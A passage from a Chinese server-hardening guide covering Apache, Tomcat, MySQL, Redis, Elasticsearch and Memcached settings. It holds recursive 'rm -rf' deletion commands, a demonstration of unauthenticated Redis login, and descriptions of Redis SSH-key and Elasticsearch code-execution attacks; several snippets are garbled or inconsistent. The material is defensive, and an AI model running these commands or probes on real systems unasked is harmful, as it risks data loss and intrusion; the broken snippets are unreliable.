<h3 id="11-绑定监听地址"><a href="#11-绑定监听地址" class="headerlink" title="11. 绑定监听地址"></a>11. 绑定监听地址</h3><p>服务器有多个 IP 地址时，只监听提供服务的 IP 地址</p>
<p><strong>1. 执行以下命令查看是否绑定 IP 地址</strong></p>
<pre><code>cat /etc/httpd/conf/httpd.conf|grep Listen
</code></pre>
<p><strong>2. 修改 &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 配置文件</strong></p>
<pre><code>Listen x.x.x.x:80
</code></pre>
<p>监听功能默认监听所有地址，如果服务器只有一个 IP 地址可不修改该项设置，如果有多个 IP 可根据需要进行设置</p>
<h3 id="12-删除缺省安装的无用文件"><a href="#12-删除缺省安装的无用文件" class="headerlink" title="12. 删除缺省安装的无用文件"></a>12. 删除缺省安装的无用文件</h3><p>删除缺省安装的无用文件</p>
<ul>
<li><p>删除缺省 HTML 文件：</p>
<pre><code>  rm -rf /usr/local/apache2/htdocs/
</code></pre>
</li>
<li><p>删除缺省的 CGI 脚本：</p>
<pre><code>  rm –rf /usr/local/apache2/cgi-bin/
</code></pre>
</li>
<li><p>删除 Apache 说明文件：</p>
<pre><code>  rm –rf /usr/local/apache2/manual
</code></pre>
</li>
<li><p>删除源代码文件：</p>
<pre><code>  rm -rf /path/to/httpd-2.2.4*
</code></pre>
</li>
<li><p>删除 CGI</p>
</li>
</ul>
<p>可根据实际情况删除，一般情况下 &#x2F;var&#x2F;www&#x2F;html &#x2F;var&#x2F;www&#x2F;cgi-bin 默认就是空的。</p>
<p>注意： 根据安装步骤不同和版本不同，某些目录或文件可能不存在或位置不同</p>
<h3 id="13-禁用非法-HTTP-方法"><a href="#13-禁用非法-HTTP-方法" class="headerlink" title="13. 禁用非法 HTTP 方法"></a>13. 禁用非法 HTTP 方法</h3><p>禁用 PUT、DELETE 等危险的 HTTP 方法</p>
<p>修改 httpd.conf 配置文件，只允许 get、post 方法</p>
<pre><code>Order Allow,Deny  Deny from all
</code></pre>
<p>可根据需要进行设置，如果需要用到 PUT 或 Delete 等 HTTP 方法的话，在<code>/etc/httpd/conf/httpd.conf </code>配置文件中相应添加即可</p>
<h2 id="0x05-Tomcat-服务安全加固"><a href="#0x05-Tomcat-服务安全加固" class="headerlink" title="0x05 Tomcat 服务安全加固"></a>0x05 Tomcat 服务安全加固</h2><p>通常 Tomcat 后台管理的 URL 地址为 <a href="http://ip:8080/manager/html/">http://iP:8080/manager/html/</a></p>
<p>Tomcat服务默认启用了管理后台功能，使用该后台可直接上传 war 文件包对站点进行部署和管理。如果管理后台存在空口令或者弱口令的漏洞，使得黑客可以利用该漏洞直接上传 Webshell 脚本导致服务器沦陷</p>
<h3 id="1-网络访问控制"><a href="#1-网络访问控制" class="headerlink" title="1. 网络访问控制"></a>1. 网络访问控制</h3><ul>
<li><p>如果业务不需要使用 Tomcat 管理后台管理业务代码，建议使用安全组防火墙功能对管理后台 URL 地址进行拦截，或直接将 Tomcat 部署目录中 webapps 文件夹中的 manager、host-manager 文件夹全部删除，并注释 Tomcat 目录中 conf 文件夹中的 tomcat-users.xml 文件中的所有代码</p>
</li>
<li><p>如果业务系统确实需要使用 Tomcat 管理后台进行业务代码的发布和管理，建议为 Tomcat 管理后台配置强口令，并修改默认 admin 用户，且密码长度不低于10位，必须包含大写字母、特殊符号、数字组合</p>
</li>
</ul>
<h3 id="2-开启-Tomcat-的访问日志"><a href="#2-开启-Tomcat-的访问日志" class="headerlink" title="2. 开启 Tomcat 的访问日志"></a>2. 开启 Tomcat 的访问日志</h3><p>修改 conf&#x2F;server.xml 文件，将下列代码取消注释：</p>
<pre><code>&lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;   
prefix=&quot;localhost_access_log.&quot; suffix=&quot;.txt&quot; pattern=&quot;common&quot; resolveHosts=&quot;false&quot;/&gt;
</code></pre>
<p>启用访问日志功能，重启 Tomcat 服务后，在 tomcat_home&#x2F;logs 文件夹中就可以看到访问日志</p>
<h3 id="3-Tomcat-默认帐号安全"><a href="#3-Tomcat-默认帐号安全" class="headerlink" title="3. Tomcat 默认帐号安全"></a>3. Tomcat 默认帐号安全</h3><p>修改 Tomcat 安装目录 conf 下的 tomcat-user.xml 文件，重新设置复杂口令并保存文件。重启 Tomcat 服务后，新口令即生效</p>
<h3 id="4-修改默认访问端口"><a href="#4-修改默认访问端口" class="headerlink" title="4. 修改默认访问端口"></a>4. 修改默认访问端口</h3><p>修改 conf&#x2F;server.xml 文件把默认的 8080 访问端口改成其它端口</p>
<h3 id="5-重定向错误页面"><a href="#5-重定向错误页面" class="headerlink" title="5. 重定向错误页面"></a>5. 重定向错误页面</h3><p>修改访问 Tomcat 错误页面的返回信息，在 webapps\manger 目录中创建相应的401.html、404.htm、500.htm 文件，然后在 conf&#x2F;web.xml 文件的最后一行之前添加下列代码：</p>
<pre><code>&lt;error-page&gt;  
                    &lt;error-code&gt;401&lt;/error-code&gt;      
                    &lt;location&gt;/401.htm&lt;/location&gt;  
            &lt;/error-page&gt;  
            &lt;error-page&gt;  
                    &lt;error-code&gt;404&lt;/error-code&gt;  
                    &lt;location&gt;/404.htm&lt;/location&gt;  
            &lt;/error-page&gt;  
            &lt;error-page&gt;  
                    &lt;error-code&gt;500&lt;/error-code&gt;  
                    &lt;location&gt;/500.htm&lt;/location&gt;  
            &lt;/error-page&gt;
</code></pre>
<h3 id="6-禁止列出目录"><a href="#6-禁止列出目录" class="headerlink" title="6. 禁止列出目录"></a>6. 禁止列出目录</h3><p>在web.xml文件中，防止直接访问目录时由于找不到默认页面，而列出目录下的文件的情况</p>
<p><param-name>listings</param-name><br><param-value>false</param-value></p>
<h3 id="7-删除文档和示例程序"><a href="#7-删除文档和示例程序" class="headerlink" title="7. 删除文档和示例程序"></a>7. 删除文档和示例程序</h3><p>删除 webapps 目录下的 docs、examples、manager、ROOT、host-manager 文件夹</p>
<h2 id="0x06-MySQL-服务安全加固"><a href="#0x06-MySQL-服务安全加固" class="headerlink" title="0x06 MySQL 服务安全加固"></a>0x06 MySQL 服务安全加固</h2><h3 id="1-帐号安全"><a href="#1-帐号安全" class="headerlink" title="1. 帐号安全"></a>1. 帐号安全</h3><p><strong>1. 禁止 Mysql 以管理员帐号权限运行</strong></p>
<p>以普通帐户安全运行 mysqld，禁止以管理员帐号权限运行 MySQL 服务。在 &#x2F;etc&#x2F;my.cnf 配置文件中进行以下设置。</p>
<pre><code>[mysql.server]
user=mysql
</code></pre>
<p><strong>2. 避免不同用户间共享帐号</strong></p>
<p>参考以下步骤</p>
<ol>
<li><p>创建用户</p>
<pre><code> mysql&gt; mysql&gt; insert into
 mysql.user(Host,User,Password,ssl_cipher,x509_issuer,x509_sub ject) values(&quot;localhost&quot;,&quot;pppadmin&quot;,password(&quot;passwd&quot;),&#39;&#39;,&#39;&#39;,&#39;&#39;);
</code></pre>
</li>
</ol>
<p>执行以上命令可以创建一个 phplamp 用户</p>
<ol start="2">
<li><p>使用该用户登录 MySQL 服务</p>
<pre><code> mysql&gt;exit;
 @&gt;mysql -u phplamp -p
 @&gt;输入密码
 mysql&gt;登录成功
</code></pre>
</li>
</ol>
<p><strong>3. 删除无关帐号</strong></p>
<p>DROP USER 语句可用于删除一个或多个 MySQL 账户。使用 DROP USER 命令时，必须确保当前账号拥有 MySQL 数据库的全局 CREATE USER 权限或 DELETE 权限。账户名称的用户和主机部分分别与用户表记录的 User 和 Host 列值相对应</p>
<p>执行DROP USER user;语句，可以取消一个账户和其权限，并删除来自所有授权表的帐户权限记录</p>
<h3 id="2-口令安全"><a href="#2-口令安全" class="headerlink" title="2. 口令安全"></a>2. 口令安全</h3><p>检查账户默认密码和弱密码。口令长度需要至少八位，并包括数字、小写字母、大写字母和特殊符号四类中的至少两种类型，且五次以内不得设置相同的口令。密码应至少每 90 天进行一次更换</p>
<p>可以通过执行以下命令修改密码</p>
<pre><code>mysql&gt; update user set password=password(&#39;test!p3&#39;) where user=&#39;root&#39;;
mysql&gt; flush privileges;
</code></pre>
<h3 id="3-授权"><a href="#3-授权" class="headerlink" title="3. 授权"></a>3. 授权</h3><p>在数据库权限配置能力范围内，根据用户的业务需要，配置其所需的最小权限</p>
<p><strong>1. 查看数据库授权情况</strong></p>
<pre><code>mysql&gt; use mysql;
mysql&gt; select * from user;
mysql&gt;select * from db;
mysql&gt;select * from host;
mysql&gt;select * from tables_priv;
mysql&gt;select * from columns_priv;
</code></pre>
<p><strong>2. 通过 revoke 命令回收不必要的或危险的授权</strong></p>
<pre><code>mysql&gt; help revoke
Name: &#39;REVOKE&#39;
Description:
Syntax:
REVOKE
priv_type [(column_list)]
[, priv_type [(column_list)]] ...
ON [object_type]
&#123;
*
| *.*
| db_name.*
| db_name.tbl_name
| tbl_name
| db_name.routine_name
&#125;
FROM user [, user] ...
</code></pre>
<h3 id="4-开启日志审计功能"><a href="#4-开启日志审计功能" class="headerlink" title="4. 开启日志审计功能"></a>4. 开启日志审计功能</h3><p>数据库应配置日志功能，便于记录运行状况和操作行为</p>
<p><strong>MySQL服务日志类型</strong></p>
<pre><code>错误日志： -log-err
查询日志： -log （可选）
慢查询日志： -log-slow-queries （可选）
更新日志： -log-update
二进制日志： -log-bin
</code></pre>
<p>找到 MySQL 的安装目录，在 my.ini 配置文件中增加上述所需的日志类型参数，保存配置文件后，重启 MySQL 服务即可启用日志功能。例如，</p>
<pre><code>#Enter a name for the binary log. Otherwise a default name will be used.
#log-bin=
#Enter a name for the query log file. Otherwise a default name will be used.
#log=
#Enter a name for the error log file. Otherwise a default name will be used.
log-error=
#Enter a name for the update log file. Otherwise a default name will be used.
#log-update=
</code></pre>
<p>该参数中启用错误日志。如果您需要启用其他的日志，只需把对应参数前面的 “#” 删除即可。</p>
<p><strong>日志查询操作说明</strong></p>
<ul>
<li>执行show variables like ‘log_%’;命令可查看所有的 log。</li>
<li>执行show variables like ‘log_bin’;命令可查看具体的 log</li>
</ul>
<h3 id="5-安装最新补丁"><a href="#5-安装最新补丁" class="headerlink" title="5. 安装最新补丁"></a>5. 安装最新补丁</h3><p>确保系统安装了最新的安全补丁</p>
<p>注意： 在保证业务及网络安全的前提下，并经过兼容性测试后，安装更新补丁</p>
<h3 id="6-远程访问控制"><a href="#6-远程访问控制" class="headerlink" title="6. 远程访问控制"></a>6. 远程访问控制</h3><p>禁止网络连接，防止猜解密码攻击、溢出攻击、和嗅探攻击。</p>
<p>注意： 仅限于应用和数据库在同一台主机的情况。</p>
<p>如果数据库不需要远程访问，可以禁止远程 TCP&#x2F;IP 连接，通过在 MySQL 服务器的启动参数中添加<code>--skip-networking</code>参数使 MySQL 服务不监听任何 TCP&#x2F;IP 连接，增加安全性。</p>
<p>您可以使用 安全组 进行内外网访问控制，建议不要将数据库高危服务对互联网开放。</p>
<h3 id="7-IP-访问控制"><a href="#7-IP-访问控制" class="headerlink" title="7.  IP 访问控制"></a>7.  IP 访问控制</h3><p>通过数据库所在操作系统的防火墙限制，实现只有信任的 IP 才能通过监听器访问数据库。</p>
<pre><code>mysql&gt; GRANT ALL PRIVILEGES ON db.*
·-&gt; -&gt; TO 用户名@&#39;IP子网/掩码&#39;;
</code></pre>
<h3 id="8-连接数设置"><a href="#8-连接数设置" class="headerlink" title="8. 连接数设置"></a>8. 连接数设置</h3><p>根据您的机器性能和业务需求，设置最大、最小连接数</p>
<p>在 MySQL 配置文件（my.conf 或 my.ini）的 [mysqld] 配置段中添加<code>max_connections = 1000</code>，保存配置文件，重启 MySQL 服务后即可生效。</p>
<h2 id="0x07-Redis-服务安全加固"><a href="#0x07-Redis-服务安全加固" class="headerlink" title="0x07 Redis 服务安全加固"></a>0x07 Redis 服务安全加固</h2><p><strong>漏洞描述</strong></p>
<p>Redis 因配置不当存在未授权访问漏洞，可以被攻击者恶意利用</p>
<p>在特定条件下，如果 Redis 以 root 身份运行，黑客可以给 root 账号写入 SSH 公钥文件，直接通过 SSH 登录受害服务器，从而获取服务器权限和数据。一旦入侵成功，攻击者可直接添加账号用于 SSH 远程登录控制服务器，给用户的 Redis 运行环境以及 Linux 主机带来安全风险，如删除、泄露或加密重要数据，引发勒索事件等</p>
<p><strong>受影响范围</strong></p>
<p>在 Redis 客户端，尝试无账号登录 Redis：</p>
<pre><code>root@kali:~# redis-cli -h 10.16.10.2
redis 10.16.10.2:6379&amp;gt; keys *
</code></pre>
<p>从登录结果可以看出，该 Redis 服务对公网开放，且未启用认证</p>
<h3 id="1-网络层加固"><a href="#1-网络层加固" class="headerlink" title="1.网络层加固"></a>1.网络层加固</h3><p><strong>指定 Redis 服务使用的网卡</strong></p>
<p>默认情况下，Redis 监听 127.0.0.1。如果仅仅是本地通信，请确保监听在本地</p>
<p>这种方式可以在一定程度上缓解 Redis 未授权访问的风险（例外情况下，如果 Redis 以 root 用户运行，攻击者借助已有的 webshell，就可以利用该 Redis 来反弹 shell 以实现提权）</p>
<p>在 redis.conf 文件中找到 # bind 127.0.0.1，将前面的 # 去掉，然后保存</p>
<p><strong>注意：</strong></p>
<ol>
<li><p>该操作需要重启 Redis 才能生效。</p>
</li>
<li><p>修改后只有本机才能访问 Redis，也可以指定访问源 IP 来访问 Redis</p>
<p> bind 192.168.1.100 10.0.0.1</p>
</li>
</ol>
<h3 id="2-设置防火墙策略"><a href="#2-设置防火墙策略" class="headerlink" title="2.设置防火墙策略"></a>2.设置防火墙策略</h3><p>如果正常业务中 Redis 服务需要被其他服务器来访问，可以通过 iptables 策略，仅允许指定的 IP 来访问 Redis 服务</p>
<pre><code>iptables -A INPUT -s x.x.x.x -p tcp --dport 6379 -j ACCEPT
</code></pre>
<h3 id="3-账号与认证"><a href="#3-账号与认证" class="headerlink" title="3.账号与认证"></a>3.账号与认证</h3><p><strong>设置访问密码</strong></p>
<p>在 redis.conf 中找到 requirepass 字段，去掉其注释，并在后面填上需要的密码。Redis 客户端也需要使用此密码来访问 Redis 服务。</p>
<p>打开 &#x2F;etc&#x2F;redis&#x2F;redis.conf 配置文件:</p>
<pre><code>requirepass MLDk$*091e8331lcfs
</code></pre>
<p>确保密码的复杂度，配置完毕后重启服务即可生效</p>
<h3 id="4-服务运行权限最小化"><a href="#4-服务运行权限最小化" class="headerlink" title="4.服务运行权限最小化"></a>4.服务运行权限最小化</h3><p><strong>修改 Redis 服务运行账号</strong></p>
<p>请以较低权限账号运行 Redis 服务，并禁用该账号的登录权限。以下操作创建了一个无 home 目录权限，且无法登录的普通账号：</p>
<pre><code>useradd -M -s /sbin/nologin [username]
</code></pre>
<p><strong>注意</strong>：该操作需要重启 Redis 才能生效</p>
<h3 id="5-服务细粒度授权"><a href="#5-服务细粒度授权" class="headerlink" title="5.服务细粒度授权"></a>5.服务细粒度授权</h3><p><strong>隐藏重要命令</strong></p>
<p>Redis 无权限分离，其管理员账号和普通账号无明显区分。攻击者登录后可执行任意操作，因此需要隐藏以下重要命令：<code>FLUSHDB, FLUSHALL, KEYS,PEXPIRE, DEL, CONFIG, SHUTDOWN, BGREWRITEAOF, BGSAVE, SAVE, SPOP, SREM, RENAME,DEBUG, EVAL</code></p>
<p>另外，在 Redis 2.8.1 及 Redis 3.x （低于 3.0.2） 版本下存在 EVAL 沙箱逃逸漏洞，攻击者可通过该漏洞执行任意 Lua 代码。</p>
<p>下述配置将 <code>config/flushdb/flushall</code> 设置为空，即禁用该命令；也可设置为一些复杂的、难以猜测的名字。</p>
<pre><code>rename-command CONFIG &quot;&quot;
rename-command flushall &quot;&quot;
rename-command flushdb &quot;&quot;
rename-command shutdown shotdown_test
</code></pre>
<p>保存后，执行 <code>/etc/init.d/redis-server restart</code> 重启生效</p>
<h3 id="6-安全补丁"><a href="#6-安全补丁" class="headerlink" title="6.安全补丁"></a>6.安全补丁</h3><p>定期关注最新软件版本，并及时升级 Redis 到最新版，防止新漏洞被恶意利用。</p>
<h2 id="0x08-Elasticsearch服务安全加固"><a href="#0x08-Elasticsearch服务安全加固" class="headerlink" title="0x08 Elasticsearch服务安全加固"></a>0x08 Elasticsearch服务安全加固</h2><p>Elasticsearch 是一个基于 Lucene 的搜索服务，它提供了 RESTful web 接口的分布式、多用户全文搜索引擎 。Elasticsearch 是用 Java 开发的，并作为 Apache 许可条款下的开放源码发布，是第二大最流行的企业搜索引擎</p>
<p>Elasticsearch 应用于云计算中，具有实时搜索、稳定、可靠、快速、安装使用方便等优势；但也存在一些安全隐患：默认安装完成后，Elasticsearch 可以使用 9200 端口通告 web 的方式访问查看数据信息</p>
<p><strong>漏洞详情</strong></p>
<p>Elasticsearch 中存在以下高危漏洞</p>
<table>
<thead>
<tr>
<th>类型</th>
<th align="left">CVE</th>
<th align="left">受影响版本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>远程命令执行</td>
<td align="left">CVE-2014-3120</td>
<td align="left">-</td>
<td>Elasticsearch 的脚本执行 (scripting) 功能，可以很方便地对查询出来的数据进行再加工处理。但是，其使用的 MVEL 脚本引擎没有做过任何防护（或者沙盒包装），可以直接执行任意代码</td>
</tr>
<tr>
<td>远程代码执行</td>
<td align="left">-</td>
<td align="left">1.3.0-1.3.7，1.4.0-1.4</td>
<td>Elasticsearch 使用 Groovy 作为脚本语言，虽然加入了沙盒进行控制，危险的代码会被拦截。但是由于沙盒限制不严格，仅通过黑白名单来判断，导致攻击者可以绕过沙盒，执行远程代码</td>
</tr>
<tr>
<td>未授权访问</td>
<td align="left">-</td>
<td align="left">-</td>
<td>Elasticsearch 在安装了 River 机制之后可以同步多种数据库数据（包括关系型的MySQL、MongoDB 等）。如果 <a href="http://localhost:9200/cat/indices">http://localhost:9200/cat/indices</a> 中 indices 包含了 _river，则代表 Elasticsearch 已安装 River 机制。而通过泄露的 <a href="http://localhost:9200/_rvier/_search">http://localhost:9200/_rvier/_search</a> URL 地址，攻击者可以获取到敏感信息</td>
</tr>
</tbody></table>
<p><strong>漏洞成因与危害</strong></p>
<p>由于 Elasticsearch 的 HTTP 连接没有提供任何的权限控制措施，一旦部署在公共网络就容易有<code>数据泄露</code>的风险</p>
<h3 id="1-使用最新版本"><a href="#1-使用最新版本" class="headerlink" title="1. 使用最新版本"></a>1. 使用最新版本</h3><p>通过<a href="https://www.elastic.co/downloads?spm=a2c4g.11186623.2.10.25913a81D2Cdwa">Elastic 官网</a>下载 Elasticsearch 的最新版本</p>
<ul>
<li>下载完成后，将下载文件的 sha1 值和下载时官网页面提供的 sha1 值进行对比，避免下载过程中被恶意攻击者拦截破坏文件，甚至注入恶意代码</li>
<li>不要随便安装第三方的插件，插件有可能引入安全漏洞甚至本身自带后门，需谨慎使用</li>
<li>关注 Elastic 网站，及时更新 Elasticsearch 至最新版本。Elasticsearch 每次版本发布都会优化和改进一部分功能，尤其是安全漏洞的补丁。同时，仔细阅读 Elasticsearch 的版本更新记录</li>
</ul>
<p><strong>注意：</strong>更新升级前，建议先进行快照备份，及本地测试</p>
<h3 id="2-网络访问控制"><a href="#2-网络访问控制" class="headerlink" title="2. 网络访问控制"></a>2. 网络访问控制</h3><p>Elasticsearch 默认端口是 9200</p>
<ol>
<li>不要把 Elasticsearch 的 9200 端口服务发布到互联网上</li>
<li>使用 云安全组防火墙 或本地操作系统防火墙对访问源 IP 进行隔离控制</li>
</ol>
<h3 id="3-绑定访问源-IP"><a href="#3-绑定访问源-IP" class="headerlink" title="3. 绑定访问源 IP"></a>3. 绑定访问源 IP</h3><p>进入 config 目录，修改 <code>elasticsearch.yml</code>配置文件中以下参数：</p>
<p>network.bind_host: 192.168.0.1 # 设置绑定的 IP 地址，可以是 IPv4 或 IPv6 地址，默认为 0.0.0.0</p>
<p>network.publish_host: 192.168.0.1 # 设置其它节点和该节点交互的 IP 地址，如果不设置它会自动判断，值必须是个真实的 IP 地址</p>
<p>network.host: 192.168.0.1 # 同时设置上述两个参数：bind_host 和 publish_host。</p>
<h3 id="4-修改默认端口"><a href="#4-修改默认端口" class="headerlink" title="4. 修改默认端口"></a>4. 修改默认端口</h3><p>进入 config 目录，修改<code> elasticsearch.yml</code> 配置文件中以下参数：</p>
<p>ransport.tcp.port: 9300  # 设置节点间交互的 TCP 端口，默认是 9300。<br>transport.tcp.compress: true  # 设置是否压缩 TCP 传输时的数据，默认为 false，即不压缩。<br>http.port: 9200  # 设置对外服务的 HTTP 端口，默认为 9200。</p>
<h3 id="5-关闭-HTTP-访问"><a href="#5-关闭-HTTP-访问" class="headerlink" title="5. 关闭 HTTP 访问"></a>5. 关闭 HTTP 访问</h3><p>进入 config 目录，修改 elasticsearch.yml 配置文件中以下参数：</p>
<p>http.enabled: false  #是否使用 HTTP 协议对外提供服务，默认为 true，即开启</p>
<h3 id="6-使用-Shield-安全插件"><a href="#6-使用-Shield-安全插件" class="headerlink" title="6. 使用 Shield 安全插件"></a>6. 使用 Shield 安全插件</h3><p>Shield 是 Elastic 公司为 Elasticsearch 开发的一个安全插件。在安装此插件后，Shield 会拦截所有对 Elasticsearch 的请求，并进行认证与加密，保障 Elasticsearch 及相关系统的安全性。Shield 是商业插件，需要 Elasticsearch 的商业许可。第一次安装许可的时候，会提供 30 天的免费试用权限。30 天后，Shield 将会屏蔽 clusterhealth, cluster stats, index stats 等 API，其余功能不受影响</p>
<p><strong>1. 用户认证</strong></p>
<p>使用 Shield 可以定义一系列已知的用户，并用其认证用户请求。这些用户存在于抽象的“域”中。一个“域”可以是下面几种类型：</p>
<ul>
<li>LDAP 服务</li>
<li>ActiveDirectory 服务</li>
<li>本地 esusers 配置文件（类似 &#x2F;etc&#x2F;passwd)</li>
</ul>
<p><strong>2. 权限控制</strong></p>
<p>Shield 的权限控制包含下面几种元素：</p>
<pre><code>1）被保护的资源 SecuredResource：权限所应用到的对象，比如某个 index，cluster 等。
2）特权 Priviliege：角色对对象可以执行的一种或多种操作，比如 read，write 等。还可以是 indicies:/data/read/perlocate 等对某种对象特有的操作。
3）许可 Permissions：对被保护的资源拥有的一个或多个特权，如 read on the&quot;products&quot; index。
4）角色 Role：一组许可的集成，具有独立的名称。
5）用户 Users：用户实体，可以被赋予多种角色，他们可以对被保护的资源执行相应角色所拥有的各种特权
</code></pre>
<p><strong>3. 安装 Shield</strong></p>
<p>执行安装步骤前，请确保满足以下安装环境条件：</p>
<ul>
<li>安装了 Java7 或更新版本</li>
<li>您将 Elasticsearch 1.5.0+ 解压安装到了本机上。如果您使用 APT 或 YUM 安装，默认的安装目录可能在 &#x2F;usr&#x2F;share&#x2F;elasticsearch</li>
</ul>
<p>参照以下步骤完成安装：</p>
<p>1）进入 Elasticsearch 安装目录：</p>
<pre><code>cd /usr/share/elasticsearch
</code></pre>
<p>2）安装 Elasticsearch 许可插件：</p>
<pre><code>bin/plugin -i elasticsearch/license/latest
</code></pre>
<p>3）安装 Shield 插件：</p>
<pre><code>bin/plugin -i elasticsearch/shield/latest
</code></pre>
<p>4）将 Shield 配置文件移动或链接至 &#x2F;etc&#x2F;elasticsearch&#x2F;shield 目录中：</p>
<pre><code>ln -s /usr/share/elasticsearch/config/shield /etc/elasticsearch/shield
</code></pre>
<p>说明：Elasticsearch 服务在启动时会在 &#x2F;etc&#x2F;elasticsearch&#x2F;shield 目录下寻找 Shield 配置文件，而这些配置文件在安装 Shield 时会出现在 &#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;config&#x2F;shield 中，因此需要将配置文件移动或链接至该目录</p>
<p>5）重启 Elasticsearch 服务：</p>
<pre><code>service elasticsearch restart
</code></pre>
<p>6）新建一个 Elasticsearch 管理员账户，填写新密码：</p>
<pre><code>bin/shield/esusers
useradd es_admin -r admin
</code></pre>
<p>7）直接使用 RESTFUL API 访问 Elasticsearch 的请求都会被拒绝：</p>
<pre><code>curl -XGET &#39;http://localhost:9200/&#39;
</code></pre>
<p>需要在请求中添加用户名和密码：</p>
<pre><code>curl -u es_admin -XGET &#39;http://localhost:9200/&#39;
</code></pre>
<p>refer:</p>
<ul>
<li><a href="https://www.elastic.co/cn/downloads/shield?spm=a2c4g.11186623.2.12.25913a81D2Cdwa">Shield 官方安装指南</a></li>
</ul>
<h3 id="7-修改默认集群名称"><a href="#7-修改默认集群名称" class="headerlink" title="7. 修改默认集群名称"></a>7. 修改默认集群名称</h3><p>Elasticsearch 默认的集群名称是 elasticsearch，请在您的生产环境中将其修改成其他名称。确保在不同的环境和不同的集群下使用不同的名称；并且在监控集群节点时，如果有未知节点加入，一定要及时预警。</p>
<h3 id="8-不要以-root-身份运行"><a href="#8-不要以-root-身份运行" class="headerlink" title="8. 不要以 root 身份运行"></a>8. 不要以 root 身份运行</h3><p>不要以 root 身份来运行 Elasticsearch，不要和其他服务共用相同的用户，并把用户的权限最小化</p>
<p>应用示例：</p>
<pre><code>sudo -u es-user ES_JAVA_OPTS=&quot;-Xms1024m -Xmx1024m&quot;
/opt/elasticsearch/bin/elasticsearc
</code></pre>
<h3 id="9-正确设置数据目录"><a href="#9-正确设置数据目录" class="headerlink" title="9. 正确设置数据目录"></a>9. 正确设置数据目录</h3><p>请确保为 Elasticsearch 的目录分配了合理的读写权限，避免使用共享文件系统。确保只有 Elasticsearch 的启动用户才有权访问目录。日志目录也需要正确配置，避免泄露敏感信息。</p>
<h3 id="10-定期进行备份"><a href="#10-定期进行备份" class="headerlink" title="10. 定期进行备份"></a>10. 定期进行备份</h3><p>使用 Elasticsearch 提供的备份还原机制，定期对 Elasticsearch 的数据进行快照备份。</p>
<h3 id="11-禁用批量删除索引"><a href="#11-禁用批量删除索引" class="headerlink" title="11. 禁用批量删除索引"></a>11. 禁用批量删除索引</h3><p>Elasticsearch 支持使用全部（_all）和通配符（*）来批量删除索引。在生产环境，该操作存在一定风险，你可以通过设置 action.destructive_requires_name: true 参数来禁用它。</p>
<h3 id="12-启用日志记录功能"><a href="#12-启用日志记录功能" class="headerlink" title="12. 启用日志记录功能"></a>12. 启用日志记录功能</h3><p>Elasticsearch 的 config 文件夹里面有两个配置文件：</p>
<ul>
<li>elasticsearch.yml：基本配置文件。</li>
<li>logging.yml：日志配置文件。由于 Elasticsearch 使用 log4j 来记录日志的，logging.yml 中的设置请按普通 log4j 配置文件进行设置。</li>
</ul>
<p>启用日志功能需要修改 elasticsearch.yml 配置文件：</p>
<p>path.logs: &#x2F;path&#x2F;to&#x2F;logs  # 设置日志文件的存储路径，默认是 Elasticsearch 根目录下的 logs 文件夹</p>
<h2 id="0x09-Memcached-服务安全加固"><a href="#0x09-Memcached-服务安全加固" class="headerlink" title="0x09 Memcached 服务安全加固"></a>0x09 Memcached 服务安全加固</h2><p><strong>漏洞描述</strong></p>
<p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcached服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息</p>
<p><strong>修复方案</strong></p>
<p>Memcached默认没有启用安全功能，建议用户在使用时进行安全加固</p>
<h3 id="1-定期升级"><a href="#1-定期升级" class="headerlink" title="1. 定期升级"></a>1. 定期升级</h3><p>使用官方最新版本Memcached</p>
<h3 id="2-配置访问控制"><a href="#2-配置访问控制" class="headerlink" title="2. 配置访问控制"></a>2. 配置访问控制</h3><p>建议用户不要将服务发布到互联网上而被黑客利用，可以通过ECS安全组规则或iptables配置访问控制规则。例如，在Linux环境中运行命令<code>iptables -A INPUT -p tcp -s 192.168.0.2 —dport 11211 -j ACCEPT</code>，在iptables中添加此规则只允许192.168.0.2这个IP对11211端口进行访问</p>
<h3 id="3-绑定监听IP"><a href="#3-绑定监听IP" class="headerlink" title="3. 绑定监听IP"></a>3. 绑定监听IP</h3><p>如果Memcached没有在公网开放的必要，可在Memcached启动时指定绑定的IP地址为 127.0.0.1。例如，在Linux环境中运行以下命令：</p>
<p>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P &#x2F;tmp&#x2F;memcached.pid</p>
<h3 id="4-使用最小化权限账号"><a href="#4-使用最小化权限账号" class="headerlink" title="4. 使用最小化权限账号"></a>4. 使用最小化权限账号</h3><p>使用普通权限账号运行，指定Memcached用户。例如，在Linux环境中运行以下命令来运行Memcached：</p>
<pre><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid
</code></pre>
<h3 id="5-启用认证功能"><a href="#5-启用认证功能" class="headerlink" title="5. 启用认证功能"></a>5. 启用认证功能</h3><p>Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。<a href="http://www.postfix.org/SASL_README.html?spm=a2c4g.11186623.2.12.791a713fWaA9QS#saslauthd">SASL认证详细配置手册</a></p>
<h3 id="6-修改默认端口"><a href="#6-修改默认端口" class="headerlink" title="6. 修改默认端口"></a>6. 修改默认端口</h3><p>修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：</p>
<pre><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid
</code></pre>
<p><strong>Memcached命令参数说明</strong></p>
<pre><code>-d 是指启动一个守护进程。
-m 是指分配给Memcached使用的内存数量，单位是MB，以上为1024MB。
-u 是指运行Memcached的用户，推荐使用单独普通权限用户Memcached，而不要使用root权限账户。
-l 是指监听的服务器IP地址，例如指定服务器的IP地址为127.0.0.1。
-p 是用来设置Memcached的监听端口，默认端口为11211。建议设置1024以上的端口。
-c 是指最大运行的并发连接数，默认是1024。可按照您服务器的负载量来设定。
-P 是指设置保存Memcached的pid文件，例如保存在 /tmp/memcached.pid 位置。
</code></pre>
<h3 id="7-备份数据"><a href="#7-备份数据" class="headerlink" title="7. 备份数据"></a>7. 备份数据</h3><p>为避免数丢失，升级前请做好备份，或者建立ECS硬盘快照</p>
